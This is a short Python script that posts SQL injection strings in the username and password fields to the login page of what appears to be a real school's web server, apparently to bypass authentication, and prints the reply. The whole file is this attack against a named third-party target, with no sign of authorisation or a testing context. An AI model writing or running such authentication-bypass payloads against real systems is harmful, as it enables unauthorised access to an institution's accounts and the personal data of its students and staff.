import requests

url = 'http://sv1.choikou.edu.mo/mobileschool/layout/base/base.login.php'
myobj = {'username': "admin ' or '' = '",'password':'" or ""="','device':'desktop','ipaddr':'10.1.0.1'}
proxy = { 'ip': '172.16.254.254'}

x = requests.post(url, myobj)



print(x.text)


